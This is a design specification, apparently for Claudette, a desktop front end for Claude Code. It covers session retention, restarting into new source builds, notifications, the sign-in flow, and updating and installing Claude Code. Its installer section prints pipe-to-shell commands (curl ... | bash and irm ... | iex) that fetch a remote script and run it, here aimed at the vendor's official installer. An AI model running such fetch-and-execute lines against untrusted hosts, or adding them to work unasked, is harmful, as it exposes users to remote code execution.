**Keeping sessions.** ✅ Built 2026-10-24. The library deletes a session once no machine has used or opened it for a while: Settings → Sessions → **Delete sessions not used for a while** (on by default), with **After going unused for (days)** under it (15 by default, 1 to 3,650). Turned off, sessions stay for good.

- **Used** is the record's last-used time, which every copy sets: after a turn, on turning sync on, from **Sync now** and after ticking files as reviewed. **Opened** is when a tab last took the session's lease as it started it, opened from History or restored at launch (not again when the same run starts `claude` again): `lastOpened` in the record, written with the rest of the record left as it was. Only retention reads it, so History's *last used on DESKTOP-01* doesn't change for a session that was only opened. A copy leaves it out, since its last-used time is later.
- It runs at launch, then once a day while Claudette is open, off the UI thread, by the settings at the time.
- It never deletes a session that's open here in a tab that syncs, that's held by a live or unreadable lease, or whose record can't be read. An old library copy of a tab that no longer syncs is deleted like any other.
- It deletes the session's whole folder, a sync client's conflict copies included. The `scratch` and `usage` folders and settings sync stay.
- The setting is this machine's, but the library is shared: a machine set to fewer days deletes sessions for every machine that uses the folder, and they go from History on all of them.
- It used to be a choice of 1 month, 1 year or Forever, Forever by default. Updating carries 1 month and 1 year on as 31 and 366 days. Forever, which every settings file had because defaults are written, becomes the new default, so the first launch after the update deletes the library sessions no machine has used or opened for 15 days.
- **How it's built.** `SessionSettings.DeleteOldLibrarySessions`, `KeepLibrarySessionDays` and `LibraryRetention()`, with `FormerKeepLibrarySessions` reading the old `keepLibrarySessions`; `SessionRecord.LastOpened`, `SessionLibrary.Prune` and `MarkOpened`; `LibraryService.StartPruning`, with the open tabs' sessions from the shell (`OpenSessions`); `ClaimLeaseAsync` in `TabViewModel.Library.cs`. `SessionLibraryTests`, `SettingsAndStateTests`, and `LibraryAndHistoryTests` in the app.

**Privacy.** Transcripts contain code, command output and anything else Claude read in the project. When the user picks a library folder inside a known cloud-sync location, Claudette says so and asks them to confirm.

**Rejected alternative.** Pointing Claude Code's whole config folder at the cloud drive (`CLAUDE_CONFIG_DIR`) would also sync credentials and settings, and have several machines writing the same live files at once. The library copies only transcripts, only between turns.


### Working on Claudette

Claudette can host the Claude Code session that works on Claudette's own source. When it runs from a source build, its state survives the rebuilds that session makes: it restarts into each new build with every tab as it was. An installed Claudette uses the same handover to restart into a new release ([§2](#updating-claudette)).

- **Source builds.** A Claudette whose program is in a `bin` folder below a checkout with `Claudette.slnx` is a source build, for example one started with `dotnet run --project src/Claudette.App`. Everything below applies only to source builds.
- **Running from a copy.** A source build copies its build output to `builds` in the data folder and runs from there, so the build output itself is never in use. On Windows a running program's files are locked, so every rebuild would fail; elsewhere, replacing a running program's files can crash it.
  - Only this platform's native libraries are copied, about 40 MB on Linux and macOS and 140 MB on Windows, rather than the 700 MB for every platform.
  - Each build is copied once. The copy the running build came from is kept, since that build may still be closing; older copies are deleted.
  - With a debugger attached, or with `CLAUDETTE_RUN_IN_PLACE=1`, a source build runs in place.
- **Noticing a new build.** Claudette checks the build output every 2 seconds. A build counts once its files have stopped changing from one check to the next. A failed build writes nothing, so it's never offered.
- **Offering the restart.** **New build ready** appears at the foot of the sidebar ([§4](#sidebar)). Its dialog says when the build was made, and offers:
  - **Restart now.** A working tab's turn isn't interrupted but left as it is, and Claude Code carries it on after the restart (below).
  - **Restart when idle**, while a tab is working: it waits until no tab is starting, working or waiting on the user.
  - **Restart into new builds by itself when no tab is working**, remembered on this machine. With it on, a Claude Code session that rebuilds Claudette sees the restart as soon as its turn ends.
- **New commits upstream.** A source build checks the branch its checkout tracks (its upstream, such as `origin/main`) for new commits, as an installed Claudette checks its releases ([§2](#updating-claudette)), so a checkout of `main` keeps up with `main` as a release keeps up with releases.
  - **Checking.** At launch and every hour while **Check for Claudette updates automatically** is on, and with **Check now**, both in Settings → General, whose updates section says what the last check found. A check is `git fetch` in the checkout, with the user's git, environment and credential helper (§13, "Login shell environment"), and never asks for a password (`GIT_TERMINAL_PROMPT=0`, `GCM_INTERACTIVE=never`): a remote that needs one fails the check, which says what git said. A checkout on no branch, or on one without an upstream, isn't checked, and Settings says so.
  - **Offering them.** A badge at the foot of the sidebar, beside **New build ready**: *"3 new commits on origin/main"*. Its dialog lists them, newest first, with their subjects, authors and when they were committed (the newest 20, then *"and 12 more"*), and offers:
    - **Pull, build and restart**: pulls, builds the app and restarts into the build as **Restart now** does.
    - **Update when idle**, while a tab is working: pulls and builds now, and restarts once no tab is starting, working or waiting on the user.
    - **Pull and build**: the build is then offered as any new build is (**New build ready**), and restarted into by itself with **Restart into new builds by itself**.
    - **Skip these commits**: hides the badge until more are pushed. The upstream's commit is saved with this machine's state; Settings still says they're there.
  - **Only a fast-forward.** The checkout is often where Claudette is being worked on, so Claudette never merges, rebases, stashes or discards anything. Pulling is `git fetch`, then `git merge --ff-only` to the upstream, and is offered only when the checkout has no commits the upstream doesn't and no uncommitted changes to tracked files. Untracked files don't count, unless git refuses because the pull would overwrite one, which it says. Otherwise the dialog still lists the commits, without the actions, and says why: *"The checkout has uncommitted changes. Commit or stash them to pull."* or *"The checkout has 2 commits that origin/main doesn't. Pull it yourself."*
  - **Building.** `dotnet build` of the app's project, in the configuration the running build was built in (the folder below `bin`, such as `Debug`), run from the checkout's top so `global.json` picks the SDK. `dotnet` is the one in `DOTNET_ROOT` when the user's environment sets one, else the one on its `PATH`. The dialog shows the build's last lines while it runs. A build that fails shows them with the error and **Build again**; the checkout stays pulled. A build that runs in place (above) can't be rebuilt while it runs, so it offers **Pull** alone, and is built as the user builds it.
  - **How it's built.** `Development/SourceCheckout` (Core) reads the checkout's branch, upstream and commits, pulls and builds; `Services/SourceUpdateService` checks on the timer, keeps the skipped commit and hands the build to `RestartService`; `SourceUpdateViewModel` is the badge, its dialog and Settings' section. `SourceCheckoutTests` run real git on a clone of a repository in a temporary folder, `SourceUpdateTests` the service and view model with git and `dotnet` played by the fake launcher (`Support/FakeCheckout`), and `SourceUpdateUiTests` the badge, its dialog and Settings.
- **What's kept:**
  - Every open tab, pinned or not, in order, with its session, name, overrides, whether it syncs, kept suffixes, token stats and reviewed files.
  - The message typed in each tab, with its one-off suffixes and attached images.
  - The selected tab, and the window's position and size.
  - Tabs whose Claude Code was running start again straight away and resume their sessions. The others start when selected, as on launch.
  - A tab that was in a turn carries it on. The restart stops its Claude Code without interrupting the turn, so the transcript ends in it, and the tab starts again with `CLAUDE_CODE_RESUME_INTERRUPTED_TURN=1`: Claude Code re-runs the turn by itself, and the conversation says *"Carrying on with the turn the restart cut off."* (the re-run's messages carry `resume_reason`, which by 2.1.300 also marks a turn Claude Code goes on with from its tool calls or a permission prompt rather than running again; the note fits both). Only once, and only within 10 minutes (`CLAUDE_CODE_RESUME_INTERRUPTED_TURN_MAX_AGE_MS`, as long as a snapshot lasts), so a restart taken back a day later after an update doesn't re-run a stale prompt. This is the one time Claude Code works without being asked: only for a restart Claudette made.
  - Processes the tabs started are stopped, as when Claudette closes ([Process monitor](#process-monitor)).
- **The handover:**
  1. The running build copies the new one and writes a snapshot of the above to `restart.json` in the data folder. It saves its state, then stops every tab as closing does, and from then on writes no settings or state.
  2. It stops taking later launches ([Other ways in](#opening-a-tab)), and starts the new build with `--source-build <build output> --restore <nonce>`.
  3. The new build opens the snapshot's tabs instead of the saved ones and places its window there. Once its startup checks are done and its first page has drawn, it writes the nonce to `restart-ready` in the data folder, and the old build closes.
- **If the new build doesn't start.** It may exit first, or not say it's up within 60 seconds, in which case it's stopped. Either way the old build takes its tabs back, and starts taking launches again. Its dialog shows why, with the last lines the new build wrote to its error output. The build stays offered, to try again once it's fixed, but isn't restarted into by itself again. A broken change never costs the session that's fixing it.

**Taking screenshots without the focus.** With `CLAUDETTE_UNFOCUSED=1`, any Claudette, not only a source build, never takes the focus. Every window opens without it, and nothing brings one forward: not Settings, the Usage window, a tool call's window or the agent map asked for again while open, nor a notification's click or another launch. On Windows every window and popup also stays behind the user's windows, a fullscreen one included, as it opens and after: each move it would make in the z-order becomes a move to the bottom (`WM_WINDOWPOSCHANGING`), and a popup, whose window shows before its first layout, is sent to the bottom as it opens. PrintWindow captures a window behind the others all the same. With `CLAUDETTE_AUTOMATION_PIPE=<name>` too, Claudette takes commands on a named pipe of that name (a Unix domain socket on macOS and Linux; only this user's processes can connect, one at a time), one JSON line each, answered with one: click, right-click, toggle, set text, show, scroll, show or hide a tip, press keys, capture a window, resize one and close one. Each names its control as UI Automation saw it: its window's handle, its name, automation id and type, and where its middle was, for when several match. Without a handle, as on macOS and Linux, where there's no UI Automation to read one, a command names its window by its title, or means the main window. **Capture** saves the window as Claudette draws it, at its scale, as a PNG where it's told: what screenshots on every system take, where there's no PrintWindow. Popups aren't in it, but the window's buttons are, where a window draws its own title bar, so its ends aren't gaps: the ones Avalonia draws on Windows, which are beside the window in the visual Avalonia hosts it in, so that's what's drawn; and macOS's traffic lights, which AppKit draws over the window, so Claudette draws them in where AppKit has them (`Platform/Shell/Mac/MacWindowButtons`), in the colors of a window in front, since the window doesn't have the focus to give them theirs. **Resize** gives a window a size, in device-independent pixels, for the scripts' windows to be the same size on every system, whatever its screen: macOS fits a window to its screen as it opens, and Windows keeps one within it unless the window's largest size (`MaxWidth`, `MaxHeight`) is bigger, which resize raises. Claudette carries it out itself, through the control's automation peer, as UI Automation would: a click selects a list item, flips a switch, invokes a button or opens what expands, the control's or the nearest one's around it; a right-click opens the context menu anchored where the click was, as Claudette places menus; keys go to the window's focused control, or the window. The screenshot scripts in `tools/Claudette.Demo` set both and drive Claudette only this way, reading it through UI Automation, which only reads. They used to post the mouse's clicks to the window and use UI Automation's own actions, but Windows lets a process just started, or one whose window just closed, take the front for either: Avalonia focuses a window clicked in, whatever the window asked for. Windows draws a window without the focus with a plainer title bar, so the scripts tell each window to draw its frame as active (`WM_NCACTIVATE`) before capturing it.

## 10. Notifications

Native OS notifications (Windows toast, macOS User Notifications). Each type can be turned on or off in Settings:

- A background tab finished its turn.
- A tab needs permission or input.
- A tab's process errored or exited unexpectedly.
- Usage alerts: **Usage crosses a warning level, is on pace to run out, or resets** (see [§6](#6-token-burn-awareness)).
- Claude Code needs you to sign in (see [§11](#11-sign-in)).
- **A Claude Code update is ready** (see [§12](#12-claude-code-updates)). Claudette's own updates don't notify: they show only the badge at the sidebar's foot ([§2](#updating-claudette)).
- A project action finishes: a build or other long job ended or failed (see [§18](#project-tools)).

Clicking a notification brings Claudette to the front and goes to the relevant tab or screen. Notifications are skipped when Claudette is focused and that tab is already on screen: selected, or beside it ([§18](#split-panes)). The Dock (macOS) and taskbar (Windows) show a badge with the number of tabs needing input.

**Pushes to the phone.** Every `claude` Claudette starts gets `CLAUDE_CLIENT_PRESENCE_FILE`, naming `presence` in the data folder. The file exists only while Claudette's window is in front, so Claude Code's Remote Control pushes reach the phone only while you're away from Claudette ([§18](#remote-control-the-claude-app)).

- **What each one says.** Tab notifications carry the tab's name as their title:
  - **Finished:** the first line of Claude's reply. Only a turn that ends normally counts; one you stopped, or that ended with an error, doesn't. After a turn that changed Claude's task list, it starts with where the list stands: *"All 7 tasks done · Fixed the config and the tests pass."* or *"4 of 7 tasks left · …"* ([§5](#tasks)).
  - **Needs input:** what's waiting, such as *"Allow this command? npm test"*, *"Claude has a question: Which database?"* or *"Claude has a plan for you to review."* Perforce uses it too ([§18](#perforce-ticket-handling)): *"Perforce needs your password to log in as matt @ ssl:perforce:1666."*, or *"Perforce needs you to log in: run p4 login in a terminal, or log in with P4V."*
  - **Errors:** *"Claude Code stopped unexpectedly (exit code 3)."*, or why it couldn't start.
  - **Project actions:** *"Build editor failed (exit code 6)."* Only while Claudette isn't in front, whichever tab is selected, since the sidebar already shows the job; a job the user stopped doesn't notify.
  - **Check-ins:** Settings → Tabs → **Notify me when a check-in is sent** (off by default), which Tab settings can override ([§5](#check-ins-on-long-turns)).
- **Skipping.** App-wide notifications (usage alerts, sign-in, Claude Code updates) are skipped while Claudette is focused, because the header, the sign-in banner or the sign-in screen already shows them. Usage alerts also keep their line under the header.
- **One per subject.** A newer notification replaces an older one of the same kind for the same tab. A tab's notifications are taken away once you look at it; a waiting-prompt notification also goes once the prompt is answered. An update is announced once per version; the version last announced is saved with this machine's state, so a restart doesn't announce it again.
- **Clicking.**
  - A tab notification selects the tab, expanding its group if it's collapsed.
  - A usage alert opens the Usage panel, an update opens the update dialog, and the sign-in notification opens the sign-in dialog ([§11](#signing-in)).
  - A project action's notification selects its tab and shows the log of the run it's about in the main area.
- **Badge.** Settings → Notifications → **Show how many tabs need you**. On Windows it's an overlay icon on the taskbar button, drawn by Claudette.
- **The icon while tabs work or wait.** Settings → Notifications → **Animate it while tabs work or wait** (on by default).
  - **Waiting for a usage limit.** While a usage limit has stopped a tab's task and hasn't reset ([§6](#continuing-after-a-limit-resets)), the icon shows an hourglass, its sand running slowly down before it turns over. It shows whether or not the task will continue by itself, and goes once the limit resets, a turn starts, or the user chooses **Don't continue**. It goes before tabs working: the limit stopped a task, and the other tabs are likely to run into it too. It doesn't flash the taskbar button, since nothing needs the user.
  - **Windows:** while any tab is working, the taskbar button's overlay shows Claude's spark, pulsing. The overlay holds one image: the number of tabs needing input comes first, then the hourglass, then the spark. The spark or hourglass comes back once no tab needs input, or at once with the badge off. Windows takes the button's own icon from the package (or, unpackaged, from Claudette's AppUserModelID), so only the overlay can move.
  - **macOS:** the whole Dock icon moves, under the badge's number: Claudette types while tabs work, stands by the hourglass, on the tile's bottom-right corner, while a tab waits for a usage limit, and waves while a tab needs input.
  - The frames are drawn with the icon ([§2](#packaging-and-signing)).
- **Flashing.** When a tab starts needing input while Claudette isn't in front, the Windows taskbar button flashes until Claudette comes to the front, or no tab needs input any more. It follows **A tab needs permission or an answer**. The Dock has nothing like it; the waving does that job.
- **How each OS does it** (the code is in `Claudette.Platform/Notifications`):
  - **Windows:** WinRT toasts (`ToastNotificationManager`), called through source-generated COM interop so the app stays a plain `net10.0` build. A click raises the toast's `Activated` event in the running Claudette. An MSIX install has package identity. Run unpackaged, Claudette sets its AppUserModelID (`dotBunny.Claudette`) and registers it under `HKCU\Software\Classes\AppUserModelId`, as the Windows App SDK does. The badge and the spark use `ITaskbarList3::SetOverlayIcon`, and the flash `FlashWindowEx`.
  - **macOS:** `UNUserNotificationCenter` through the Objective-C runtime, with a delegate that reports clicks and lets notifications show while Claudette is in front. It needs the app bundle's identifier, so a build run with `dotnet run` has no notifications and Settings says so. The badge is the Dock tile's `badgeLabel`, and the animation sets `NSApplication`'s `applicationIconImage` to each frame (nil gives the bundle's icon back).
  - **Linux:** `notify-send --wait` with a default action, which reports a click. Without `notify-send`, there are no notifications.

> **Not yet tested on a real machine:** showing and clicking notifications on Windows and macOS, and the badges. CI builds a real toast through WinRT on Windows (without showing it), and checks the Objective-C string calls on macOS.

## 11. Sign-in

Claude Code keeps its own credentials. Claudette never reads or stores them; it only detects when Claude Code needs a sign-in and runs Claude Code's own sign-in flow. This is the Default account's: an API-key account's key is Claudette's to keep, and a tab under one doesn't use any of this ([§4](#accounts)).

### Detecting

- **On launch**, before any tab starts, Claudette runs `claude auth status`. It prints JSON and exits with 0 when signed in and 1 when not. The spike confirmed these fields:
  - `loggedIn` and `authMethod` (`claude.ai`, `none`, …; 2.1.284's source also has `api_key`, `api_key_helper`, `oauth_token` and `third_party`).
  - `email`, `orgName` and `subscriptionType`.
  - `configDirectory`, and `projectsDirectory`, which is where Claude Code keeps its transcripts. History uses it.
- **While running**, any of these from a session means "needs sign-in":
  - An `assistant` message with `error: "authentication_failed"`, or `"oauth_org_not_allowed"` (an account from an organization that isn't allowed, which signing in with another account fixes). This is what a signed-out Claude Code sends: it starts normally and answers the first message with *"Not logged in · Please run /login"* (the `signed-out` protocol fixture).
  - An `auth_status` message with an `error`. Claude Code 2.1.284 only sends `auth_status` with the hidden `--enable-auth-status` flag, which Claudette doesn't pass, to report cloud credential helpers such as `awsAuthRefresh`, so in practice it doesn't arrive.
  - A session that fails to start with an authentication error. Its wording isn't documented, so Claudette matches the error and the end of the process's error output loosely: `/login`, "Not logged in", "Invalid API key", "OAuth token" and the like. Anything else stays an ordinary start error with **Restart**.

### Signing in

- At launch, Claudette shows a sign-in screen instead of the tabs. In the middle of a session, it shows a banner across all tabs, which stay open: *"Claude Code needs you to sign in."*, with a **Sign in** button. If Claudette isn't focused, it also sends an OS notification, once however many tabs find Claude Code signed out. Clicking the notification opens the sign-in dialog. The account menu runs `claude auth status` again, so it shows what Claude Code now reports.
- The banner's **Sign in** opens the same sign-in screen as a dialog over the window, and starts signing in straight away. The dialog can be closed.
- **Sign in** (main flow) uses the utility session's control protocol, as the Agent SDK does:
  1. Claudette sends `claude_authenticate` with `loginWithClaudeAi: true`. Claude Code replies with two URLs and doesn't open a browser itself:
     - `automaticUrl` redirects back to a local port Claude Code is listening on, so sign-in finishes without copying anything.
     - `manualUrl` redirects to a page that shows a code to copy.
  2. Claudette opens `automaticUrl` in the default browser and sends `claude_oauth_wait_for_completion`, which returns when sign-in finishes: with the new `account`, or with the sign-in's error.
  3. If that doesn't work (for example a browser on another device, or a firewall blocking the local port), the user can switch to **Enter a code instead**. Claudette opens `manualUrl`, shows a code field, and sends the code with `claude_oauth_callback`, as `authorizationCode` and `state`: the two halves of the `code#state` the page shows. The sign-in keeps waiting meanwhile, so it finishes whichever way the browser gets there.
- These control requests are **undocumented**. The TypeScript SDK sends them from `claudeAuthenticate`, `claudeOAuthCallback` and `claudeOAuthWaitForCompletion` (SDK 0.3.284, which bundles Claude Code 2.1.284), and the answers above are from Claude Code 2.1.284's source. Claude Code refuses `claude_authenticate` when managed settings' `forceLoginMethod` rules out the kind of account asked for. No real sign-in has completed through them yet.
- **Fallback: `claude auth login`** (documented). Claudette runs it when `claude_authenticate` is rejected or returns no address, and for SSO. What it does with no terminal attached was confirmed from 2.1.284's source and the spike, but not yet with a completed sign-in:
  - It opens the browser itself, at the address that finishes on its own, and prints the other one: `If the browser didn't open, visit: <url>`, then `Paste code here if prompted >`. Claudette takes the first web address in its output, with terminal escape codes removed.
  - **Open browser again** and **Enter a code instead** open that printed address, whose page shows a code, and show the code field. The code field writes the code to the command's input, which reads one `code#state` per line. A line without both halves gets *"Invalid code. Please make sure the full code was copied."* on its error output, which Claudette shows while the command keeps waiting.
  - It exits with 0 and prints `Login successful.` once signed in, and exits with 1 and prints `Login failed: …` (or the organization's message) if not. Claudette goes by the exit code, and `claude auth status` then has the last word.
  - It's started through `IProcessLauncher` with an environment from `ClaudeEnvironment`, like every `claude` ([§13](#login-shell-environment)), and stopped after 10 minutes.
- While it waits, Claudette shows *"Finish signing in in your browser"* and stays responsive. The screen has:
  - **Open browser again**, which reopens the same URL, in case the browser didn't open or the tab was closed.
  - **Enter a code instead**, as described above.
  - **Cancel**, which also ends `claude auth login`.
  - **More options**: sign in with an Anthropic Console account for API usage billing (`claude_authenticate` with `loginWithClaudeAi: false`, or `claude auth login --console`), or with SSO (`claude auth login --sso`; the control request has no option for it). The screen offers them before signing in, too.
- **I've already signed in**, for a sign-in done in a terminal, runs `claude auth status` again, and says so if Claude Code still reports no sign-in.
- When sign-in succeeds, Claudette runs `claude auth status` again, shows the account, and restarts the utility session, so plan usage comes from the new sign-in. Any tab that failed is restarted with `--resume`. A tab that couldn't start isn't tried again until then, but still takes messages.
- **Messages sent while signed out** stay queued, with their attached images, and are delivered, in order, once sign-in completes. The message that found Claude Code signed out is one of them: a message nothing came back for before the sign-in error never reached the model, so it's sent again. One that was answered before the error isn't.
- If sign-in fails (timed out, cancelled, organization not allowed), Claudette shows Claude Code's message, from the control request or the command, and a **Try again** button, which repeats the same kind of sign-in.
- **Account menu** (in the header, on the right): the signed-in email, plan and organization from `claude auth status`, or how Claude Code is signed in when there's no plan (an API key, say), and **Sign out…**, which runs `claude auth logout`. Signed out, it offers **Sign in**.
- **Plan and billing.** In the header, the plan beside the email (*"Max plan"*) is a link to the plan's usage on claude.ai, `claude.ai/new#settings/usage` ("Plan usage"). The account menu has a link to where the account's billing is managed; the header's plan goes there too for an account with no usage page on claude.ai (an API key or Console account). Both open in the browser:
  - a Claude plan, or a Claude account without one: `claude.ai/settings/billing`, **Plan and billing**;
  - an API key or Console account: the Claude Console's billing page, **Console billing**;
  - a cloud provider (Bedrock, Vertex, Foundry) bills through that provider, so there's no link, and the header shows the account as one piece.
  - Signing out asks for confirmation first, because every tab will stop working, and Claude Code is signed out in the terminal too.
  - Afterwards Claudette runs `claude auth status`. If Claude Code still reports a sign-in (an API key in the environment, which logging out doesn't remove), it says so. Otherwise the banner shows, without a notification, messages are held, and every tab that was running restarts on its session after the next sign-in, since that may be a different account.
- **Settings → Claude Code** shows the same account with **Sign in** and **Sign out…**, wired to the same flows. Because Settings is a separate window, the sign-in screen and the confirmation show inside it.

## 12. Claude Code Updates

How Claude Code updates depends on how it was installed. `claude doctor` is a read-only diagnostic that reports the install method, whether auto-updates are on, the release channel and the last update attempt. For example (2.1.284):

```
Claude Code doctor

Running: native (2.1.284)
Commit: 2b8ce618c24d
Platform: linux-x64
Path: /home/me/.local/share/claude/versions/2.1.284
Config install method: native
Search: OK (/usr/bin/rg)
Auto-updates: enabled
Auto-update channel: latest
Last update attempt: success → 2.1.284 (2026-09-28)

1 warning found
- Leftover npm global installation at /usr/local/bin/claude
  Fix: Run: npm -g uninstall @anthropic-ai/claude-code
```

What Claudette reads from it (the command is documented; the line format isn't, so every field is optional):

- **`Running:`** gives the install type: `native`, `npm-global`, `npm-local`, `package-manager` or `development`. Anything else counts as unknown and is treated like native.
- **`Package manager:`** appears only for package-manager installs: `homebrew`, `winget`, `deb`, `rpm`, `apk`, `pacman`, `mise` or `asdf` in 2.1.284. For those, `Auto-updates:` reads `Managed by package manager`.
- **`Path:`** shows the Homebrew cask, as in `…/Caskroom/claude-code@latest/…`.
- **`Auto-updates:`** is `enabled` or `disabled (<reason>)`. The reason is `set by env: DISABLE_AUTOUPDATER`, `set by env: DISABLE_UPDATES`, `config` or `development build`.
- **Warnings** follow `N warnings found`, as `- <issue>` lines, each with an indented `Fix:`. Settings → Claude Code shows them, which covers the npm case below.
- `doctor` reads the settings files of its working folder, so Claudette runs it (and the other update commands) in its own utility folder.

| Install method | How Claude Code updates | What Claudette offers |
|---|---|---|
| Native installer (the default) | Updates itself in the background. The new version is used the next time a `claude` process starts. | Tell the user an update is installed. **Update now** runs `claude update`. |
| npm | Updates itself, if the npm global folder is writable. | Same as native. If `claude doctor` says it can't update, show the fix it suggests. |
| Homebrew | Doesn't update itself. | **Update now** runs `brew upgrade claude-code`, or `claude-code@latest` if that is the cask installed. |
| WinGet | Doesn't update itself. | **Update now** runs `winget upgrade Anthropic.ClaudeCode`. Windows locks a running executable, so this fails while any tab is running. In that case Claudette offers **Update on next launch**, which runs the upgrade at the next start, before any tab starts its process. |
| apt / dnf / apk | Needs admin rights. | Show the command to run; don't run it. |

### Installing Claude Code

✅ Built 2026-10-23, from [issue #66](https://github.com/dotBunny/Claudette/issues/66). When Claude Code is missing, the setup screen offers to install it.

- **Install Claude Code** runs Claude Code's native installer, with the command its [setup page](https://code.claude.com/docs/en/setup) gives for the OS. The screen shows the command before it runs:
  - Windows: `irm https://claude.ai/install.ps1 | iex`, in PowerShell (`-NoProfile -NonInteractive`, writing UTF-8).
  - macOS and Linux: `curl -fsSL https://claude.ai/install.sh | bash`, in bash with `pipefail`, so a failed download fails the command rather than piping nothing into a `bash` that succeeds.
- It needs no admin rights: the installer puts Claude Code in the user's home, with its launcher in `~/.local/bin`. Claudette looks there after `PATH`, so it finds the new install although its own `PATH` is from before it.
- It runs in Claudette's utility folder with the cleaned environment ([§13](#13-architecture)), since the installer ends by running `claude install`. Its output shows on the setup screen, as **Update now**'s does. The installer prints nothing while it downloads, so the screen says so under the progress bar.
- It runs in the setup screen, not a terminal window: one way on every OS (Linux has no standard terminal), and Claudette knows when it ends and whether it worked.
- It's offered when Claude Code wasn't found, when the path given is the Claude desktop app's, and on Windows when only npm's `claude.cmd` was found. It isn't offered for a version that's too old, which gets **Update now**, or one that doesn't answer.
- When it works, Claudette looks for Claude Code again, as **Check again** does. If it still can't use it, the screen says why and stays. Finding Claude Code by looking, from the setup screen, also clears a **Path to claude** in Settings that didn't work, so later launches look too.

**The Claude desktop app.** People install the Claude desktop app and take it for Claude Code. It isn't Claude Code, and it puts no `claude` on `PATH`:

- On Windows it's a package, `Claude_pzs8sxrjxfjjc`. Its `app\claude.exe` is the app itself, and its only command on `PATH` is the `claude-desktop.exe` alias. It keeps a copy of Claude Code for its own use, in a folder per version that it replaces as it updates: `%LOCALAPPDATA%\Packages\Claude_pzs8sxrjxfjjc\LocalCache\Roaming\Claude\claude-code\<version>\<hash>\claude.exe` (seen with 3.6556.2).
- On macOS it's `Claude.app`, and on Linux the `claude-desktop` package. Their copies would be under the app's data folder's `Claude/claude-code` (`~/Library/Application Support`, `~/.config`).
- Claudette never runs either. Not the app, whose `--version` would open its window. Not its copy, which the app deletes when it updates, and which **Update now** couldn't update.
- Looking for Claude Code passes over them. A path to one, in Settings or from **Choose claude…**, gets the setup screen saying it's the desktop app's, without running it.
- When Claude Code isn't found and the desktop app is installed (its `claude-desktop` command or package, or `Claude.app`), the setup screen says the desktop app isn't Claude Code, above **Install Claude Code**.

> **Not yet tested on a real machine:** the installer on macOS and Linux, and the desktop app's files there. Windows's are covered with the paths of a real install, and the installer's commands and reporting by unit tests with a fake launcher.

### Detecting an update

- On launch and every 4 hours, Claudette runs `claude --version` and `claude doctor`. **Check for Claude Code updates automatically** in Settings → Claude Code turns this off, and **Check now** runs it by hand.
- Each tab knows which version it is running: the installed version when its process started, confirmed by `claude_code_version` in its `system/init` message. If the installed version is newer, that tab is running an old version.
- For Homebrew and WinGet, Claudette checks with the package manager:
  - Homebrew: `brew outdated --cask --greedy --json=v2 <cask>`, which reads Homebrew's local index, so it knows what Homebrew last fetched.
  - WinGet: `winget list --id Anthropic.ClaudeCode --exact --upgrade-available`. Not `winget upgrade --id …`, which would install the update.
- There is no documented "check only" command for native installs, so Claudette relies on the auto-updater and notices the new version with `claude --version`.
- If updates are turned off (`DISABLE_UPDATES`, set directly or through managed settings), Claudette shows the version but doesn't offer to update.

### Applying it

- A small, non-blocking badge appears at the foot of the sidebar: *"Claude Code 2.1.290 is ready"* (an icon when the sidebar is collapsed). Clicking it shows the current and new version, a link to the Claude Code changelog, and the actions from the table above.
  - It appears when the package manager has a newer version than the one installed, or when the installed version is newer than the one an open tab is running.
  - **Dismiss** hides it until a newer version comes along, across restarts too: the dismissed version is saved with this machine's state. It also goes away once no open tab runs an older version.
  - Settings → Claude Code shows the same details and actions, plus the install method, auto-update state, channel, last update attempt and `claude doctor`'s warnings.
- **Open tabs are never restarted.** Each tab's `claude` process keeps running the version it started with until the tab is closed. Claudette doesn't restart tabs to apply an update, automatically or otherwise.
  - **New tabs** always start on the newly installed version.
  - **To move an open tab to the new version**, close it and open a new one, or reopen its session from History.
  - **Pinned tabs** pick up the new version the next time Claudette launches, because restored tabs start new processes.
- A tab running an older version than the one installed shows a small note in its tooltip, for example *"Running Claude Code 2.1.284; 2.1.290 is installed. New tabs use 2.1.290."*
- **Update now** shows the command's output in a small progress dialog and reports the new version when it succeeds. `claude update` prints `Successfully updated from <old> to version <new>`, or `Claude Code is up to date (<version>)`; either way Claudette reads the new version with `claude --version` afterwards.
- **WinGet.** Claudette's hidden utility session is a running `claude` too. **Update now** stops it first; it starts again when next needed. While any tab is running, **Update on next launch** replaces **Update now**. It's saved with this machine's state, and runs at the next start, before the utility session or any tab starts its process.
- **Minimum version.** Claudette declares the lowest Claude Code version it supports. If the installed version is older, the setup screen asks you to update before any tab starts, with the same **Update now** action.

> **Not yet tested on a real machine:** the Homebrew and WinGet checks and upgrades. Their commands and output parsing are covered by unit tests with recorded output; `claude update` and `claude doctor` are also covered with `fake-claude` and the real CLI.

## 13. Architecture

```
┌──────────────────────── Claudette.App (Avalonia) ────────────────────────┐
│  Views + ViewModels: MainWindow, UsageHeader, Sidebar, Conversation,     │
│  Composer, DiffView, Processes, History, SignIn, Settings                │
└───────────────┬───────────────────────────────┬──────────────────────────┘
                │                               │
┌───────────────▼──────────────┐  ┌─────────────▼──────────────┐  ┌───────────────────┐
│ Claudette.Core               │  │ Claudette.Usage            │  │ Claudette.Platform│
│  ClaudeSession (1 per tab)   │  │  UsagePoller (sampling)    │  │  Process monitor  │
│   ├ process + stdio          │  │  UsageStore (SQLite)       │  │  (Job Objects,    │
│   ├ protocol reader/writer   │  │  BurnRate (projection)     │  │   /proc, ps)      │
│   └ typed event stream       │  │  UsageAlerts               │  │  Notifications,   │
│  TranscriptReader, History   │  └────────────────────────────┘  │   Dock/taskbar    │
│  SessionLibrary, leases      │                                  │   badge           │
│  Diffs: line diff, changed   │                                  │  Jump list, one   │
│   files, external diff tools │                                  │   instance        │
│  Claude Code updates         │                                  │  Credential store │
│  Source builds: copies, new  │                                  │  Update installers│
│   builds, restart snapshots  │                                  │  (MSIX, .app)     │
│  Claudette releases, updates │                                  │  Login shell's    │
│  Git: identity, working tree │                                  │   environment     │
│  Auth, install checks        │                                  └───────────────────┘
│  Perforce: tickets, CLs      │
│  Claude's service status     │
│  Settings, state, sync       │
└───────────────┬──────────────┘
                │ stdin/stdout (JSON lines)
        ┌───────▼───────┐
        │  claude CLI   │  × one per tab
        └───────────────┘
```

- **Claudette.Core** has no UI dependencies, so it can be unit tested and could be reused by another front end. External diff tools live here rather than in Platform: they only look for files and start processes through `IProcessLauncher`. So does running a source build from a copy and restarting it into new builds ([§9](#working-on-claudette)), which is plain file copying and process starting on every OS.
- **Claudette.Usage** holds the usage engine, with no UI: parsing, the SQLite history, the burn rate and projection, alerts and the polling schedule.
